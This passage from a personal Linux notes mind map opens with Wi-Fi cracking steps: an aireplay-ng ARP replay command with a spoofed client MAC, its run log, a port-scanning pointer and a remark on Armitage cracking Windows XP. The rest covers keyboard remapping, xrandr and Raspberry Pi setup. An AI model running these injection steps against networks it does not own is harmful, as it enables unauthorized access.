      2) a list of hosts communicating with that router. These hosts are listed as &quot;stations&quot; and they connect to the router &quot;BSSID&quot;
    </p>
    <p>
      look for a host sending lots of info (lots of frames)
    </p>
    <p>
      Grab it's MAC ADDRESS (under &quot;station&quot; category).
    </p>
    <p>
      now replay the traffic you find from it using
    </p>
    <p>
      <b>aireplay-ng -3 -b &lt;bssid / router MAC&gt; -h &lt;host MAC&gt; mon0 </b>
    </p>
    <p>
      at first it'll only replay acks. But if it catches an ARP request, it can resend it and get increasingly large amounts of data back
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_1976858207" CREATED="1505494660215" MODIFIED="1505495123175"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      <i>sudo aireplay-ng -3 -b 94:AA:52:BB:77:04 -h 00:AA:CA:BB:09:86 mon0 </i>
    </p>
    <p>
      <i>The interface MAC (38:59:F9:DD:B3:BF) doesn't match the specified MAC (-h). </i>
    </p>
    <p>
      <i>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ifconfig mon0 hw ether 00:C0:CA:69:09:86 </i>
    </p>
    <p>
      <i>19:35:22&#160;&#160;Waiting for beacon frame (BSSID: 94:AA:52:BB:77:04) on channel 11 </i>
    </p>
    <p>
      <i>Saving ARP requests in replay_arp-0914-193522.cap </i>
    </p>
    <p>
      <i>You should also start airodump-ng to capture replies. </i>
    </p>
    <p>
      <i>Notice: got a deauth/disassoc packet. Is the source MAC associated ? </i>
    </p>
    <p>
      <i>Notice: got a deauth/disassoc packet. Is the source MAC associated ? </i>
    </p>
    <p>
      <i>Notice: got a deauth/disassoc packet. Is the source MAC associated ? </i>
    </p>
    <p>
      <i>Notice: got a deauth/disassoc packet. Is the source MAC associated ? </i>
    </p>
    <p>
      <i>Notice: got a deauth/disassoc packet. Is the source MAC associated ? </i>
    </p>
    <p>
      <i>^Cad 201442 packets <b>(got 24838 ARP requests and 59768 ACKs), sent 26197 packets...(499 pps)</b></i>
    </p>
  </body>
</html>
</richcontent>
</node>
</node>
<node TEXT="you can do a port scan once connected to the network" ID="ID_843869350" CREATED="1505493333797" MODIFIED="1505493361073" LINK="https://askubuntu.com/questions/224559/how-to-find-all-the-used-ip-addresses-on-a-network"/>
</node>
</node>
<node TEXT="Kali linux" FOLDED="true" ID="ID_108970637" CREATED="1505491803956" MODIFIED="1505491805958">
<node TEXT="Linux version used to enable easy security testing of network and computer security" ID="ID_379853533" CREATED="1505491808939" MODIFIED="1505491835226"/>
<node TEXT="Armitage -- software for &quot;script kiddies&quot; allows you to quickly identify vulnerabilities in your computers at home connected to the network. Can crack WinXP awfully easy." ID="ID_1153025642" CREATED="1505491835815" MODIFIED="1505491887355"/>
</node>
</node>
<node TEXT="Keyboard" FOLDED="true" POSITION="right" ID="ID_1342270989" CREATED="1515194300830" MODIFIED="1515194302343">
<edge COLOR="#808080"/>
<node TEXT="keyboard remapping keys" FOLDED="true" ID="ID_1231368239" CREATED="1505758246194" MODIFIED="1515194304336">
<node TEXT="I&apos;ve done remap of CapsLock to Esc" ID="ID_193744382" CREATED="1505758255360" MODIFIED="1505758266088"/>
<node TEXT="remap PrtSc (printscreen) to Conext menu" FOLDED="true" ID="ID_290891165" CREATED="1505758266417" MODIFIED="1505758283955" LINK="http://www.visionfactory.com.au/blog/remapping-print-screen-to-context">
<node TEXT="First get the keycode for you PrintScreen button" ID="ID_1631372416" CREATED="1505758331286" MODIFIED="1505758344696" LINK="https://unix.stackexchange.com/questions/49650/how-to-get-keycodes-for-xmodmap"/>
<node TEXT="(it still was keycode 107)" ID="ID_699464815" CREATED="1505759442817" MODIFIED="1505759454918"/>
<node TEXT="Then set this in your .Xmodmap&#xa;keycode 107 = Menu&#xa;or run this in bash:&#xa;xmodmap -e &quot;keycode 107 = Menu&quot;" ID="ID_1087153741" CREATED="1505759455305" MODIFIED="1505759489611"/>
<node TEXT="Finally, disable PrintSc to screenshot utility under your gnome-keyboard settings:&#xa;keyboard -&gt; shortcuts" ID="ID_1251408998" CREATED="1505759493836" MODIFIED="1505759526477"/>
</node>
<node TEXT="Detect and remap keyboards" ID="ID_1058581118" CREATED="1515194949884" MODIFIED="1515194960468" LINK="https://superuser.com/questions/75817/two-keyboards-on-one-computer-when-i-write-with-a-i-want-a-us-keyboard-layout"/>
</node>
<node TEXT="Detect usb / ps2 keyboards" ID="ID_233030493" CREATED="1515194305783" MODIFIED="1515194315525">
<node TEXT="For PS/2: cat /proc/bus/input/devices" ID="ID_525758399" CREATED="1515194316682" MODIFIED="1515194337810"/>
<node TEXT="You can also locate devices through /dev/input/by-path" FOLDED="true" ID="ID_675795692" CREATED="1515194603969" MODIFIED="1515194686776" LINK="https://stackoverflow.com/questions/15880196/keyboard-device-in-unix">
<node TEXT="ls /dev/input/by-path&#xa;produced:&#xa;pci-0000:00:12.2-usb-0:4:1.0-event  platform-i8042-serio-4-event-mouse  platform-i8042-serio-5-event-mouse  platform-thinkpad_acpi-event&#xa;platform-i8042-serio-0-event-kbd    platform-i8042-serio-4-mouse        platform-i8042-serio-5-mouse" ID="ID_1982941132" CREATED="1515194690256" MODIFIED="1515194714997"/>
<node TEXT="Then running&#xa;cat platform-i8042-serio-0-event-kbd&#xa;I was able to capture all input coming from the keyboard.&#xa;SUCCESS! That should allow me to know which keypresses are coming from which keyboard" ID="ID_380942822" CREATED="1515194756791" MODIFIED="1515194808352"/>
</node>
</node>
<node TEXT="Ignore a keyboard" FOLDED="true" ID="ID_626702285" CREATED="1515195021602" MODIFIED="1515195026293" LINK="https://askubuntu.com/questions/160945/is-there-a-way-to-disable-a-laptops-internal-keyboard">
<node ID="ID_600598215" CREATED="1515195072586" MODIFIED="1515195110636"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      you can use xinput to float the input device under X.
    </p>
    <p>
      
    </p>
    <p>
      <b>1)</b>&#160;&#160;&#160;&#160;Execute the command xinput list to list your input devices.
    </p>
    <p>
      <b>2)</b>&#160;&#160;&#160;&#160;Locate AT Translated Set 2 keyboard and take note of its id number; this will be used to disable the keyboard. Also, take note of the number at the end, [slave keyboard (#)]; this is the id number of the master, which will be used to re-enable your keyboard.
    </p>
    <p>
      <b>3)</b>&#160;&#160;&#160;&#160;To disable the keyboard, execute the command xinput float &lt;id#&gt;, where &lt;id#&gt; is your keyboard's id number. For example, if the id was 10, then the command would be xinput float 10.
    </p>
    <p>
      <b>4)</b>&#160;&#160;&#160;&#160;To re-enable the keyboard, execute the command xinput reattach &lt;id#&gt; &lt;master#&gt;, where master is that second number we noted down. So if the number was 3, you would do xinput reattach 10 3.
    </p>
  </body>
</html>
</richcontent>
</node>
<node TEXT="A demonstration:" FOLDED="true" ID="ID_1224088919" CREATED="1515195138700" MODIFIED="1515195149471">
<font BOLD="true"/>
<node TEXT="$ xinput list&#xa;&#x23a1; Virtual core pointer                      id=2    [master pointer  (3)]&#xa;&#x239c;   &#x21b3; Virtual core XTEST pointer                id=4    [slave  pointer  (2)]&#xa;&#x239c;   &#x21b3; SynPS/2 Synaptics TouchPad                id=11   [slave  pointer  (2)]&#xa;&#x239c;   &#x21b3; Logitech USB-PS/2 Optical Mouse           id=12   [slave  pointer  (2)]&#xa;&#x239c;   &#x21b3; Logitech Unifying Device. Wireless PID:4004   id=13   [slave  pointer  (2)]&#xa;&#x23a3; Virtual core keyboard                     id=3    [master keyboard (2)]&#xa;    &#x21b3; Virtual core XTEST keyboard               id=5    [slave  keyboard (3)]&#xa;    &#x21b3; Power Button                              id=6    [slave  keyboard (3)]&#xa;    &#x21b3; Video Bus                                 id=7    [slave  keyboard (3)]&#xa;    &#x21b3; Sleep Button                              id=8    [slave  keyboard (3)]&#xa;    &#x21b3; Acer CrystalEye webcam                    id=9    [slave  keyboard (3)]&#xa;    &#x21b3; AT Translated Set 2 keyboard              id=10   [slave  keyboard (3)]&#xa;$ xinput float 10&#xa;$ xinput list&#xa;&#x23a1; Virtual core pointer                      id=2    [master pointer  (3)]&#xa;&#x239c;   &#x21b3; Virtual core XTEST pointer                id=4    [slave  pointer  (2)]&#xa;&#x239c;   &#x21b3; SynPS/2 Synaptics TouchPad                id=11   [slave  pointer  (2)]&#xa;&#x239c;   &#x21b3; Logitech USB-PS/2 Optical Mouse           id=12   [slave  pointer  (2)]&#xa;&#x239c;   &#x21b3; Logitech Unifying Device. Wireless PID:4004   id=13   [slave  pointer  (2)]&#xa;&#x23a3; Virtual core keyboard                     id=3    [master keyboard (2)]&#xa;    &#x21b3; Virtual core XTEST keyboard               id=5    [slave  keyboard (3)]&#xa;    &#x21b3; Power Button                              id=6    [slave  keyboard (3)]&#xa;    &#x21b3; Video Bus                                 id=7    [slave  keyboard (3)]&#xa;    &#x21b3; Sleep Button                              id=8    [slave  keyboard (3)]&#xa;    &#x21b3; Acer CrystalEye webcam                    id=9    [slave  keyboard (3)]&#xa;&#x223c; AT Translated Set 2 keyboard              id=10   [floating slave]&#xa;$ xinput reattach 10 3&#xa;$ xinput list&#xa;&#x23a1; Virtual core pointer                      id=2    [master pointer  (3)]&#xa;&#x239c;   &#x21b3; Virtual core XTEST pointer                id=4    [slave  pointer  (2)]&#xa;&#x239c;   &#x21b3; SynPS/2 Synaptics TouchPad                id=11   [slave  pointer  (2)]&#xa;&#x239c;   &#x21b3; Logitech USB-PS/2 Optical Mouse           id=12   [slave  pointer  (2)]&#xa;&#x239c;   &#x21b3; Logitech Unifying Device. Wireless PID:4004   id=13   [slave  pointer  (2)]&#xa;&#x23a3; Virtual core keyboard                     id=3    [master keyboard (2)]&#xa;    &#x21b3; Virtual core XTEST keyboard               id=5    [slave  keyboard (3)]&#xa;    &#x21b3; Power Button                              id=6    [slave  keyboard (3)]&#xa;    &#x21b3; Video Bus                                 id=7    [slave  keyboard (3)]&#xa;    &#x21b3; Sleep Button                              id=8    [slave  keyboard (3)]&#xa;    &#x21b3; Acer CrystalEye webcam                    id=9    [slave  keyboard (3)]&#xa;    &#x21b3; AT Translated Set 2 keyboard              id=10   [slave  keyboard (3)]" ID="ID_1199512848" CREATED="1515195131621" MODIFIED="1515195133267"/>
</node>
</node>
</node>
<node TEXT="scp" FOLDED="true" POSITION="right" ID="ID_1917353019" CREATED="1509389173060" MODIFIED="1509389174074">
<edge COLOR="#808080"/>
<node TEXT="scp -P &lt;port&gt; &lt;local file to copy&gt; &lt;username&gt;@&lt;address&gt;:~/&lt;relative path in target user&apos;s directory&gt;" ID="ID_838650122" CREATED="1509389176891" MODIFIED="1509389262386"/>
</node>
<node TEXT="ffmpg" POSITION="right" ID="ID_1786257559" CREATED="1514395489149" MODIFIED="1514395499621">
<edge COLOR="#808080"/>
</node>
<node TEXT="xrandr" FOLDED="true" POSITION="right" ID="ID_5829997" CREATED="1516256776862" MODIFIED="1516256784458">
<edge COLOR="#808080"/>
<node TEXT="useful for changing resolution / rotation of screen" ID="ID_1365136138" CREATED="1516256785632" MODIFIED="1516256796791"/>
<node TEXT="can get all screen outputs just by typing&#xa;xrandr" ID="ID_1541145361" CREATED="1516256797207" MODIFIED="1516256808329">
<node TEXT="which for me gives:&#xa;&#xa;Screen 0: minimum 320 x 200, current 1366 x 768, maximum 8192 x 8192&#xa;VGA-0 disconnected (normal left inverted right x axis y axis)&#xa;LVDS connected 1366x768+0+0 (normal left inverted right x axis y axis) 309mm x 174mm&#xa;   1366x768      60.03*+&#xa;   1280x720      59.86 &#xa;   1152x768      59.78 &#xa;   1024x768      59.92 &#xa;   800x600       59.86 &#xa;   848x480       59.66 &#xa;   720x480       59.71 &#xa;   640x480       59.38 &#xa;HDMI-0 disconnected (normal left inverted right x axis y axis)" ID="ID_1857095568" CREATED="1516256832604" MODIFIED="1516256854214"/>
<node TEXT="note that LVDS is the connected source. So that&apos;s what I use after --output" ID="ID_606973885" CREATED="1516256869778" MODIFIED="1516256882255"/>
</node>
<node TEXT="example of rotation:&#xa;xrandr --output LVDS --rotate left" ID="ID_549147677" CREATED="1516256808548" MODIFIED="1516256825397"/>
<node TEXT="xrandr failed when I didn&apos;t have an OpenGL driver running: It failed to rotate, and wouldn&apos;t give me a name for the connected device" ID="ID_799898019" CREATED="1516918576720" MODIFIED="1516918617122"/>
</node>
<node TEXT="Raspi" FOLDED="true" POSITION="right" ID="ID_805117541" CREATED="1516257453311" MODIFIED="1516257455364">
<edge COLOR="#808080"/>
<node TEXT="control tv over CEC" ID="ID_1212266793" CREATED="1516257458182" MODIFIED="1516257462965" LINK="https://raspberrypi.stackexchange.com/questions/8698/how-can-my-raspberry-pi-turn-on-off-my-samsung-tv">
<node TEXT="aaand how to enable CEC feature on TV (if it exists)" ID="ID_1672702172" CREATED="1516257475651" MODIFIED="1516257490340" LINK="https://www.howtogeek.com/207186/how-to-enable-hdmi-cec-on-your-tv-and-why-you-should/"/>
</node>
<node TEXT="turn TV on/off with IR LED" ID="ID_862653640" CREATED="1516257625344" MODIFIED="1516257635191" LINK="http://www.raspberry-pi-geek.com/Archive/2015/10/Raspberry-Pi-IR-remote"/>
<node TEXT="wifi hosting" ID="ID_1556276875" CREATED="1516304941582" MODIFIED="1516304945691" LINK="https://frillip.com/using-your-raspberry-pi-3-as-a-wifi-access-point-with-hostapd/">
<node TEXT="alternative version from adafruit" ID="ID_106125355" CREATED="1516305295395" MODIFIED="1516305303453" LINK="https://cdn-learn.adafruit.com/downloads/pdf/setting-up-a-raspberry-pi-as-a-wifi-access-point.pdf"/>
</node>
<node TEXT="wifi connection from cmd" ID="ID_1047626599" CREATED="1516818712995" MODIFIED="1516818719961" LINK="http://codefoster.com/pi-wifi/">
<node TEXT="from adafruit" ID="ID_612767082" CREATED="1516818880282" MODIFIED="1516818885605" LINK="https://learn.adafruit.com/adafruits-raspberry-pi-lesson-3-network-setup/setting-up-wifi-with-occidentalis"/>
</node>
<node TEXT="host watermark / image on screen with GL" ID="ID_1719782585" CREATED="1516823867792" MODIFIED="1516823878609" LINK="http://www.geeks3d.com/hacklab/20151207/how-to-control-the-window-opacity-on-the-raspberry-pi/"/>
<node TEXT="execute script on gui startup" ID="ID_651758546" CREATED="1516409476320" MODIFIED="1516409482160" LINK="https://www.raspberrypi.org/forums/viewtopic.php?t=43509"/>
<node TEXT="create partially opaque windows" ID="ID_1654442675" CREATED="1516763662159" MODIFIED="1516763673989" LINK="http://www.geeks3d.com/hacklab/20151207/how-to-control-the-window-opacity-on-the-raspberry-pi/"/>
<node TEXT="ssh-copy-id" ID="ID_196414947" CREATED="1516412936203" MODIFIED="1516412939721">
<node TEXT="use it to copy your public ID to another computer (as you log in to their computer) so that you don&apos;t have to use your fingerprint from there on" ID="ID_169401308" CREATED="1516491748867" MODIFIED="1516491775712"/>
<node TEXT="ssh-copy-id user@ip_address" ID="ID_1915485728" CREATED="1516491811582" MODIFIED="1516491824281"/>
</node>
<node TEXT="missing libGLESv2.so" FOLDED="true" ID="ID_40802816" CREATED="1516825243342" MODIFIED="1516825256082" LINK="https://www.raspberrypi.org/forums/viewtopic.php?t=191857">
<node TEXT="looks like we have broadcom-specific compiled versions, so they aren&apos;t named correctly..." ID="ID_1846217927" CREATED="1516825256881" MODIFIED="1516825282139"/>
<node TEXT="the suggested solution was to ln -s (symbolic link) from the various libraries to the renamed version in the same directory" ID="ID_828198993" CREATED="1516826838158" MODIFIED="1516826864202">
<node TEXT="cd /opt/vc/lib&#xa;sudo ln -s libbrcmEGL.so libEGL.so&#xa;sudo ln -s libbrcmGLESv2.so libGLESv2.so&#xa;sudo ln -s libbrcmOpenVG.so libOpenVG.so&#xa;sudo ln -s libbrcmWFC.so libWFC.so" ID="ID_376900226" CREATED="1516826865107" MODIFIED="1516826962513"/>
</node>
<node TEXT="that still didn&apos;t work for my program. Had to run&#xa;strace &lt;program&gt; to see where it was looking to find libGLESv2.so" ID="ID_1984109258" CREATED="1516826963893" MODIFIED="1516826997947"/>
<node TEXT="So I symbolic linked them to /usr/lib/" ID="ID_1039801877" CREATED="1516826998327" MODIFIED="1516827011576"/>
<node TEXT="FAILED TO ADD SERVICE - ALREADY IN USE?" ID="ID_85369291" CREATED="1516827675172" MODIFIED="1516827686415" LINK="https://stackoverflow.com/questions/40490113/eglfs-on-raspberry2-failed-to-add-service-already-in-use">
<node TEXT="I got this error after symbolic linking" ID="ID_1006520088" CREATED="1516827687656" MODIFIED="1516827695075"/>
<node TEXT="Turns out when I enabled experimental GL, it enabled a feature that my demo-code was trying to enable and failing. Editting my /boot/config.txt to remove the &quot;vc4-kms-v3d overlay&quot; worked!" ID="ID_1152444321" CREATED="1516827695557" MODIFIED="1516827906582"/>
</node>
<node TEXT="You can also symbolic link the mesa libraries" ID="ID_745738767" CREATED="1516828706629" MODIFIED="1516828715703"/>
</node>
<node TEXT="geexlab graphics" ID="ID_1713140692" CREATED="1516909107790" MODIFIED="1516909118943">
<node TEXT="library for displaying opengl graphics! It works really well... smooth animations" ID="ID_732688511" CREATED="1516909124332" MODIFIED="1516909155489"/>
<node TEXT="documentation" ID="ID_1995164425" CREATED="1516909119960" MODIFIED="1516909122764" LINK="http://www.geeks3d.com/glslhacker/reference/scripting_gpu_buffer.php"/>
<node TEXT="reference (different than documentation)" ID="ID_1830924389" CREATED="1517511702786" MODIFIED="1517511716813" LINK="http://www.geeks3d.com/geexlab/reference/"/>
</node>
<node TEXT="rotate display from initial boot" ID="ID_373257126" CREATED="1516931011461" MODIFIED="1516931021068" LINK="https://www.raspberrypi.org/forums/viewtopic.php?f=108&amp;t=120793">
<node TEXT="I put display_rotate=3 to rotate my display left" ID="ID_1413189171" CREATED="1516931022431" MODIFIED="1516931061334"/>
<node TEXT="this works even when xrandr failed due to unloaded opengl drivers" ID="ID_1841882802" CREATED="1516931062957" MODIFIED="1516931075140"/>
</node>
<node TEXT="disable swap file (really bad if you accidentally hammer your sd card - End-of-life it way too fast" FOLDED="true" ID="ID_700354962" CREATED="1516943747859" MODIFIED="1516943769074" LINK="https://github.com/MrChrisJ/fullnode/issues/20">
<node ID="ID_1064808980" CREATED="1516943785352" MODIFIED="1516943793768"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <pre http-equiv="content-type" content="text/html; charset=utf-8" style="font-family: SFMono-Regular, Consolas, Liberation Mono, Menlo, Courier, monospace; font-size: 11.9px; margin-top: 0px; margin-bottom: 16px; padding-top: 16px; padding-right: 16px; padding-bottom: 16px; padding-left: 16px; line-height: 1.45; background-color: rgb(246, 248, 250); color: rgb(36, 41, 46); font-style: normal; font-weight: 400; letter-spacing: normal; text-align: start; text-indent: 0px; text-transform: none; word-spacing: 0px"><code style="font-family: SFMono-Regular, Consolas, Liberation Mono, Menlo, Courier, monospace; font-size: 11.9px; padding-top: 0px; padding-right: 0px; padding-bottom: 0px; padding-left: 0px; margin-top: 0px; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; background-image: null; background-repeat: repeat; background-attachment: scroll; background-position: null; white-space: pre; border-top-style: none; border-top-width: 0px; border-right-style: none; border-right-width: 0px; border-bottom-style: none; border-bottom-width: 0px; border-left-style: none; border-left-width: 0px; display: inline; line-height: inherit"><font face="SFMono-Regular, Consolas, Liberation Mono, Menlo, Courier, monospace" size="11.9px">sudo systemctl disable dphys-swapfile</font></code></pre>
  </body>
</html>
</richcontent>
</node>
<node TEXT="and then status (after reboot) using htop" ID="ID_1623028652" CREATED="1516943796732" MODIFIED="1516943807045"/>
</node>
</node>
<node TEXT="bluetooth wiimote ciiwiid" FOLDED="true" POSITION="right" ID="ID_1981353560" CREATED="1516918662677" MODIFIED="1516918670145">
<edge COLOR="#808080"/>
<node TEXT="I had a lot of trouble connecting my wiimote. wmgui would fail all the time&#xa;but SUDO WMGUI WORKED! *sigh*" ID="ID_755008317" CREATED="1516918672555" MODIFIED="1516918703508"/>
</node>
<node TEXT="bashing" POSITION="right" ID="ID_441473652" CREATED="1517882821510" MODIFIED="1517882823667">
<edge COLOR="#808080"/>
<node TEXT="!! (repeat full last command)" ID="ID_970059800" CREATED="1517882825772" MODIFIED="1517882831794"/>
<node TEXT="!$ (repeat last arguments)" ID="ID_168125679" CREATED="1517882832136" MODIFIED="1517882841025"/>
</node>
<node TEXT="imagemagick / convert" FOLDED="true" POSITION="right" ID="ID_1022930177" CREATED="1517441648414" MODIFIED="1517441654893">
<edge COLOR="#808080"/>
<node TEXT="crop an image using extent" ID="ID_1251601050" CREATED="1517441655900" MODIFIED="1517441667424" LINK="https://www.imagemagick.org/Usage/crop/#extent">
<node TEXT="hint: use -gravity center to crop to the center of an image" ID="ID_1431867526" CREATED="1517600495969" MODIFIED="1517600513286"/>
</node>
<node TEXT="adding color" ID="ID_1618939786" CREATED="1517600362449" MODIFIED="1517600371864" LINK="https://www.imagemagick.org/script/color.php">
<node TEXT="colors are added as strings:&#xa;&apos;#FF00FF&apos;&#xa;&apos;rgb(255, 0, 255)&apos;" ID="ID_1487797725" CREATED="1517600373100" MODIFIED="1517600409267"/>
</node>
<node TEXT="adding background" ID="ID_359902694" CREATED="1517600470949" MODIFIED="1517600478410" LINK="https://www.imagemagick.org/Usage/backgrounds/"/>
</node>
<node TEXT="3D model construction from pictures&#xa;(structure from motion)" POSITION="right" ID="ID_644458170" CREATED="1517601164794" MODIFIED="1517601181250" LINK="https://github.com/pmoulon/CMVS-PMVS">
<edge COLOR="#808080"/>
</node>
</node>
</map>
